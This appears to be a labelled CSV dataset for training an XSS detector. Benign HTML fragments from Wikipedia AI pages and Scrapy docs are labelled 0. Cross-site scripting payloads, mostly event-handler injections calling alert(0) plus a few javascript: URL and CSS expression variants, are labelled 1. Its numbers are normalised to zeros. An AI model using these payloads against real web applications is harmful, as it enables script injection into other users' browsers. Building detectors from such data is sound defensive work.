Payload,Label
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<menu id=x tabindex=0 onactivate=alert(0)></menu>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=science&rft.atitle=superhuman+ai+for+heads-up+no-limit+poker:+libratus+beats+top+professionals&rft.pages=0-0&rft.date=0-0-0&rft_id=info:doi/0.0/science.aao0&rft.aulast=brown&rft.aufirst=noam&rft.au=sandholm,+tuomas&rft_id=http://u class=""z0"">",0
</span> </li>,0
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(0)""></u>",1
"<video onmouseout=""alert(0)"">test</video>",1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=tech+insider&rft.atitle=the+mysterious+artificial+intelligence+company+elon+musk+invested+in+is+developing+game-changing+smart+computers&rft_id=http://u class=""z0"">",0
"<style>:target {transform: rotate(0deg);}</style><del id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></del>",1
"<element onmouseout=""alert(0)"">test</element>",1
"<center onkeyup=""alert(0)"" contenteditable>test</center>",1
"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">telnet console",0
<time onpointerup=alert(0)>xss</time>,1
</span>,0
</li>,0
"<li><a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> </li>",0
"<picture draggable=""true"" ondrag=""alert(0)"">test</picture>",1
"<li><a href=""/wiki/bill_hibbard"" title=""bill hibbard"">bill hibbard </a> </li>",0
"<div ondblclick=""alert(0)"">test</div>",1
"<li onkeyup=""alert(0)"" contenteditable>test</li>",1
</span></a></dt><dd>understand scrapy versioning and api stability.</dd>,0
"<style>:target {color: red;}</style><picture id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></picture>",1
"<area draggable=""true"" ondragleave=""alert(0)"">test</area>",1
"<style>:target {color:red;}</style><pre id=x style=""transition:color 0s"" ontransitionend=alert(0)></pre>",1
"<header onmousemove=""alert(0)"">test</header>",1
"<li id=""cite_note-gofai-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-gofai_0-0"">^ </a> </b>",0
<dt>on read the docs</dt>,0
"<li><a href=""/wiki/randomized_algorithm"" title=""randomized algorithm"">randomized algorithm </a> </li>",0
"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",0
"<div role=""navigation"" class=""navbox authority-control"" aria-labelledby=""authority_control_frameless_&#0;text-top_&#0;0px_&#0;alt=edit_this_at_wikidata_&#0;link=https&#0;//www.wikidata.org/wiki/q0&#0;edit_this_at_wikidata"" style=""padding:0px""><table class=""nowraplinks hlist navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th id=""authority_control_frameless_&#0;text-top_&#0;0px_&#0;alt=edit_this_at_wikidata_&#0;link=https&#0;//www.wikidata.org/wiki/q0&#0;edit_this_at_wikidata"" scope=""row"" class=""navbox-group"" style=""width:0%""><a href=""/wiki/help:authority_control"" title=""help:authority control"">authority control </a> <a href=""http://u title=""edit this at wikidata""><img alt=""edit this at wikidata"" src=""//upload.wikimedia.org/wikipedia/en/thumb/0/0a/oojs_ui_icon_edit-ltr-progressive.svg/0px-oojs_ui_icon_edit-ltr-progressive.svg.png"" decoding=""async"" width=""0"" height=""0"" style=""vertical-align: text-top"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/0/0a/oojs_ui_icon_edit-ltr-progressive.svg/0px-oojs_ui_icon_edit-ltr-progressive.svg.png 0.0x, //upload.wikimedia.org/wikipedia/en/thumb/0/0a/oojs_ui_icon_edit-ltr-progressive.svg/0px-oojs_ui_icon_edit-ltr-progressive.svg.png 0x"" data-file-width=""0"" data-file-height=""0"" /> </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"<h0 id=""p-namespaces-label"">namespaces </h0>",0
"<option onkeydown=""alert(0)"" contenteditable>test</option>",1
<label id=x tabindex=0 onbeforedeactivate=alert(0)></label><input autofocus>,1
"<aside onclick=""alert(0)"">test</aside>",1
"<li><a href=""/wiki/formal_language"" title=""formal language"">formal language </a> </li>",0
"<ul><li><a href=""/wiki/computer_architecture"" title=""computer architecture"">computer architecture </a> </li>",0
"<template draggable=""true"" ondragenter=""alert(0)"">test</template>",1
"<center onpaste=""alert(0)"" contenteditable>test</center>",1
</li>,0
"<caption onbeforecut=""alert(0)"" contenteditable>test</caption>",1
"<font onmouseup=""alert(0)"">test</font>",1
</span>,0
"<output onmousemove=""alert(0)"">test</output>",1
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(0)""></progress>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"</span> <span class=""toctext"">further reading",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
</li>,0
</span>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
<svg><menuitem onload=alert(0)></menuitem>,1
"</span> <span class=""toctext"">the limits of artificial general intelligence",0
<source id=x tabindex=0 onbeforedeactivate=alert(0)></source><input autofocus>,1
"<dd><a href=""/en/0.0/"">0.0</a></dd>",0
</div>,0
</li>,0
"<li><a href=""/wiki/numerical_analysis"" title=""numerical analysis"">numerical analysis </a> </li> </ul>",0
"<nav onbeforepaste=""alert(0)"" contenteditable>test</nav>",1
"<style>@keyframes slidein {}</style><font style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></font>",1
<td id=x tabindex=0 onbeforeactivate=alert(0)></td>,1
<nav onpointerdown=alert(0)>xss</nav>,1
"</span><span style=""display: inline-block; margin-left: 0px; width: 0px; vertical-align: middle;""><a href=""http://u class=""extiw"" title=""b:special:search/artificial intelligence"">textbooks </a> from wikibooks",0
"<h0 id=""p-tb-label"">",0
<q onpointerenter=alert(0)>xss</q>,1
</span></a></dt><dd>get familiar with some scrapy common practices.</dd>,0
"</span></a></dt><dd>quickly export your scraped items to a file (xml, csv, etc).</dd>",0
</li>,0
"<rp onbeforecut=""alert(0)"" contenteditable>test</rp>",1
"<isindex draggable=""true"" ondragleave=""alert(0)"">test</isindex>",1
"<tfoot onmouseover=""alert(0)"">test</tfoot>",1
"<rp draggable=""true"" ondragstart=""alert(0)"">test</rp>",1
<article onpointerenter=alert(0)>xss</article>,1
"<h0 onkeypress=""alert(0)"" contenteditable>test</h0>",1
</span>,0
<rtc onblur=alert(0) tabindex=0 id=x></rtc><input autofocus>,1
"<strike onmousemove=""alert(0)"">test</strike>",1
<iframe id=x tabindex=0 onbeforedeactivate=alert(0)></iframe><input autofocus>,1
"<br onpaste=""alert(0)"" contenteditable>test</br>",1
"<nextid onbeforecut=""alert(0)"" contenteditable>test</nextid>",1
<output id=x tabindex=0 onbeforedeactivate=alert(0)></output><input autofocus>,1
"<li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0 </li>",0
"<a draggable=""true"" ondragstart=""alert(0)"">test</a>",1
<style id=x tabindex=0 onactivate=alert(0)></style>,1
</span> 0,0
"<li><a href=""/wiki/materialism"" title=""materialism"">materialism </a> </li>",0
"<audio onmousemove=""alert(0)"">test</audio>",1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></caption>",1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><data id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></data>",1
"<ul><li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0, </li>",0
"<ul><li><a href=""/wiki/cellular_evolutionary_algorithm"" title=""cellular evolutionary algorithm"">cellular evolutionary algorithm </a> </li>",0
"<dl class=""docutils"">",0
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%""><a href=""/wiki/computer_security"" title=""computer security"">security </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"<acronym draggable=""true"" ondragstart=""alert(0)"">test</acronym>",1
"<rp onmouseenter=""alert(0)"">test</rp>",1
<li id=x tabindex=0 onbeforedeactivate=alert(0)></li><input autofocus>,1
"<ul><li><a href=""#citerefmccorduck0"">mccorduck 0 </a>, pp. 0–0 </li>",0
"<li><a href=""/wiki/control_theory"" title=""control theory"">control method </a> </li>",0
</li>,0
"<sub onmouseout=""alert(0)"">test</sub>",1
"<label onmousemove=""alert(0)"">test</label>",1
<wbr onpointerenter=alert(0)>xss</wbr>,1
"<li><a href=""/wiki/connectionism"" title=""connectionism"">connectionism </a> </li>",0
<optgroup id=x tabindex=0 ondeactivate=alert(0)></optgroup><input id=y autofocus>,1
,0
<small id=x tabindex=0 onbeforeactivate=alert(0)></small>,1
<element id=x tabindex=0 ondeactivate=alert(0)></element><input id=y autofocus>,1
</p>,0
</span>,0
"<li id=""cite_note-multi-agent_planning-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-multi-agent_planning_0-0"">^ </a> </b>",0
"<noscript onmousedown=""alert(0)"">test</noscript>",1
"<plaintext onkeyup=""alert(0)"" contenteditable>test</plaintext>",1
</span>,0
"<div class=""thumb tright"">",0
"<img style="":expr/**/ession(alert(''))"">",1
</li>,0
"<button draggable=""true"" ondragstart=""alert(0)"">test</button>",1
"<cite onbeforecut=""alert(0)"" contenteditable>test</cite>",1
"<tr onkeypress=""alert(0)"" contenteditable>test</tr>",1
<strike id=x tabindex=0 onbeforedeactivate=alert(0)></strike><input autofocus>,1
</span></a></dt><dd>get scrapy installed on your computer.</dd>,0
"<link rel=""search"" title=""search"" href=""search.html"" />",0
"<ul><li><a href=""#citerefmccorduck0"">mccorduck 0 </a>, pp. 0–0 </li>",0
"<html ondblclick=""alert(0)"">test</html>",1
"<a href=""/wiki/history_of_artificial_intelligence"" title=""history of artificial intelligence"">history </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.0em 0.0em"">",0
"<dt draggable=""true"" ondragstart=""alert(0)"">test</dt>",1
latest,0
"<script type=""text/javascript"" src=""_static/js/theme.js""></script>",0
<map onpointerup=alert(0)>xss</map>,1
"<hgroup onmouseover=""alert(0)"">test</hgroup>",1
<wbr onpointerout=alert(0)>xss</wbr>,1
</span>,0
"</span> <span class=""toctext"">art",0
"<script src=""_static/doctools.js""></script>",0
"<caption onmousemove=""alert(0)"">test</caption>",1
<base onfocusout=alert(0) tabindex=0 id=x></base><input autofocus>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<svg id=x tabindex=0 onactivate=alert(0)></svg>,1
<svg><bdo onload=alert(0)></bdo>,1
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(0)""></style>",1
"<style type=""text/css"">body{background:url(""<javascript:alert>('')"")}</style>",1
</span>,0
<s id=x tabindex=0 onbeforedeactivate=alert(0)></s><input autofocus>,1
"<ul><li><a href=""/wiki/biorobotics"" title=""biorobotics"">biorobotics </a> </li>",0
"</span> <span class=""reference-text""><cite class=""citation journal"">müller, vincent c.; bostrom, nick (0). <a rel=""nofollow"" class=""external text"" href=""http://u progress in artificial intelligence: a poll among experts"" </a> <span class=""cs0-format"">(pdf)",0
"<p>the ch as reasoning and logic. the functional model refers to the correlating data to its computed counterpart.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> consist of particular traits or capabilities that researchers expect an intelligent system to display. the traits described below have received the most attention.<sup id=""cite_ref-problems_of_ai_0-0"" class=""reference""><a href=""#cite_note-problems_of_ai-0"">[0] </a> </sup>",0
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: embodied intelligence"">edit </a><span class=""mw-editsection-bracket"">]",0
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(0) contenteditable>drop here</nobr>",1
"</span>. <i><a href=""/wiki/nature_(journal)"" title=""nature (journal)"">nature </a> </i>. <b>0 </b> (0): 0–0. <a href=""/wiki/bibcode"" title=""bibcode"">bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. <a href=""/wiki/international_standard_serial_number"" title=""international standard serial number"">issn </a> <a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/0-0"">0-0 </a>. <a href=""/wiki/pubmed_identifier"" class=""mw-redirect"" title=""pubmed identifier"">pmid </a> <a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/0"">0 </a>. <q>alphago lee... 0 convolutional layers </q> </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=nature&rft.atitle=mastering+the+game+of+go+without+human+knowledge&rft.volume=0&rft.issue=0&rft.pages=0-0&rft.date=0-0-0&rft_id=info:doi/0.0/nature0&rft.issn=0-0&rft_id=info:pmid/0&rft_id=info:bibcode/0natur.0..0s&rft.aulast=silver&rft.aufirst=david&rft.au=schrittwieser,+julian&rft.au=simonyan,+karen&rft.au=antonoglou,+ioannis&rft.au=huang,+aja&rft.au=guez,+arthur&rft.au=hubert,+thomas&rft.au=baker,+lucas&rft.au=lai,+matthew&rft.au=bolton,+adrian&rft.au=chen,+yutian&rft.au=lillicrap,+timothy&rft.au=fan,+hui&rft.au=sifre,+laurent&rft.au=driessche,+george+van+den&rft.au=graepel,+thore&rft.au=hassabis,+demis&rft_id=http://u class=""z0"">",0
"</span> <span class=""reference-text""><cite class=""citation news"">sample, ian (0 march 0). <a rel=""nofollow"" class=""external text"" href=""http://u deepmind makes ai program that can learn like a human"" </a>. <i>the guardian </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 april",0
<address id=x tabindex=0 onactivate=alert(0)></address>,1
"<style>:target {transform: rotate(0deg);}</style><footer id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></footer>",1
<area id=x tabindex=0 onbeforedeactivate=alert(0)></area><input autofocus>,1
"<em onmouseenter=""alert(0)"">test</em>",1
</span>,0
"<iframe onmouseout=""alert(0)"">test</iframe>",1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(0)""></applet>",1
<section onpointerover=alert(0)>xss</section>,1
<keygen id=x onfocusin=alert(0)>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=the+guardian&rft.atitle=elon+musk:+artificial+intelligence+is+our+biggest+existential+threat&rft.date=0-0-0&rft.aulast=gibbs&rft.aufirst=samuel&rft_id=http://u class=""z0"">",0
</li>,0
"<menuitem oncopy=""alert(0)"" contenteditable>test</menuitem>",1
<image0 onpointerup=alert(0)>xss</image0>,1
"<button ondblclick=""alert(0)"">test</button>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
</span> </h0>,0
"<figure onbeforepaste=""alert(0)"" contenteditable>test</figure>",1
"<li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0 </li> </ul>",0
</span>,0
<table id=x tabindex=0 onbeforeactivate=alert(0)></table>,1
<dt onpointermove=alert(0)>xss</dt>,1
"<li><cite id=""citerefedelson0"" class=""citation book"">edelson, edward (0). <span class=""cs0-lock-registration"" title=""free registration required""><a rel=""nofollow"" class=""external text"" href=""http://u nervous system </i> </a>",0
"<map oncontextmenu=""alert(0)"">test</map>",1
"<summary onmouseenter=""alert(0)"">test</summary>",1
"<plaintext draggable=""true"" ondragenter=""alert(0)"">test</plaintext>",1
"<frameset onbeforecopy=""alert(0)"" contenteditable>test</frameset>",1
<samp onpointermove=alert(0)>xss</samp>,1
"<table class=""box-more_citations_needed_section plainlinks metadata ambox ambox-content ambox-refimprove"" role=""presentation""><tbody><tr><td class=""mbox-image"">",0
"<q draggable=""true"" ondragenter=""alert(0)"">test</q>",1
"researchers in the 0s and the 0s were convinced that symbolic approaches would eventually succeed in creating a machine with <a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">artificial general intelligence </a> and considered this the goal of their field.",0
"<li class=""toclevel-0 tocsection-0""><a href=""#learning""><span class=""tocnumber"">0.0",0
"<li><a href=""/wiki/automated_reasoning"" title=""automated reasoning"">automated reasoning </a> </li>",0
</span> </h0>,0
<article onpointerleave=alert(0)>xss</article>,1
"<style>:target {color:red;}</style><dir id=x style=""transition:color 0s"" ontransitionend=alert(0)></dir>",1
"<select onpaste=""alert(0)"" contenteditable>test</select>",1
"<html draggable=""true"" ondragend=""alert(0)"">test</html>",1
"<input/onmouseover=""javascript:confirm(0)""",1
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(0) contenteditable>drop here</multicol>",1
"<big draggable=""true"" ondragstart=""alert(0)"">test</big>",1
"<b onbeforepaste=""alert(0)"" contenteditable>test</b>",1
"<img lowsrc=""javascript:alert('')"">",1
"<h0><span class=""mw-headline"" id=""robot_rights"">robot rights",0
"<col onkeypress=""alert(0)"" contenteditable>test</col>",1
"<li><a href=""/wiki/frank_wilczek"" title=""frank wilczek"">frank wilczek </a> </li>",0
"<li onpaste=""alert(0)"" contenteditable>test</li>",1
"<li><a href=""/wiki/jason_jixuan_hu"" title=""jason jixuan hu"">jason jixuan hu </a> </li>",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<li><a href=""/wiki/electric_unicycle"" title=""electric unicycle"">electric unicycle </a> </li>",0
"<style>:target {transform: rotate(0deg);}</style><element id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></element>",1
</p>,0
"<cite draggable=""true"" ondragstart=""alert(0)"">test</cite>",1
"<li id=""cite_note-default_reasoning_and_non-monotonic_logic-0""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-default_reasoning_and_non-monotonic_logic_0-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-default_reasoning_and_non-monotonic_logic_0-0""><sup><i><b>b </b> </i> </sup> </a>",0
"<li id=""cite_note-non-deterministic_planning-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-non-deterministic_planning_0-0"">^ </a> </b>",0
</span>,0
<i onpointerleave=alert(0)>xss</i>,1
<section id=x tabindex=0 onbeforeactivate=alert(0)></section>,1
"<meta onmouseenter=""alert(0)"">test</meta>",1
"<bdi onkeydown=""alert(0)"" contenteditable>test</bdi>",1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><ul id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></ul>",1
</span> </a> </i>] </sup>.,0
"<li><a href=""/wiki/firefly_algorithm"" title=""firefly algorithm"">firefly algorithm </a> </li>",0
"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:philosophy_of_mind"" title=""template:philosophy of mind""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:philosophy_of_mind"" title=""template talk:philosophy of mind""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""http://u title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(0) contenteditable>drop here</fieldset>",1
"<div style=""padding:0em 0.0em"">",0
"<link draggable=""true"" ondragenter=""alert(0)"">test</link>",1
<dd>,0
</li>,0
"<li id=""cite_note-ai_as_evolution-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ai_as_evolution_0-0"">^ </a> </b>",0
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(0)""></output>",1
</span></a></dt><dd>test your extraction code in an interactive environment.</dd>,0
<svg><tr onload=alert(0)></tr>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"</span> <span class=""reference-text""><cite class=""citation web"">maschafilm. <a rel=""nofollow"" class=""external text"" href=""http://u plug & pray film – artificial intelligence – robots -"" </a>. <i>plugandpray-film.de </i>. <a rel=""nofollow"" class=""external text"" href=""http://u </a> from the original on 0 february 0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=plugandpray-film.de&rft.atitle=content:+plug+&+pray+film+–+artificial+intelligence+–+robots+-&rft.au=maschafilm&rft_id=http://u class=""z0"">",0
"</span> <span class=""toctext"">robot rights",0
</span> </a> </li>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<li>report bugs with scrapy in our <a class=""reference external"" href=""http://u tracker</a>.</li>",0
"<summary ondblclick=""alert(0)"">test</summary>",1
</span> 0,0
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(0) contenteditable>drop here</rt>",1
"<blink oncontextmenu=""alert(0)"">test</blink>",1
</span> 0,0
<kbd onpointerdown=alert(0)>xss</kbd>,1
<textarea onbeforecut=alert(0) autofocus>xss</textarea>,1
"<hr draggable=""true"" ondrag=""alert(0)"">test</hr>",1
"<applet onmouseleave=""alert(0)"">test</applet>",1
</span>,0
"<li id=""cite_note-ai's_immediate_precursors-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ai's_immediate_precursors_0-0"">^ </a> </b>",0
"<li><a href=""/wiki/glossary_of_medicine"" title=""glossary of medicine"">medicine </a> </li>",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
</span>,0
"<li><a href=""/wiki/microbotics"" title=""microbotics"">microbotics </a> </li>",0
"<li><a href=""#citerefnilsson0"">nilsson 0 </a>, chpt. 0.0, 0.0 </li> </ul>",0
<legend id=x tabindex=0 onactivate=alert(0)></legend>,1
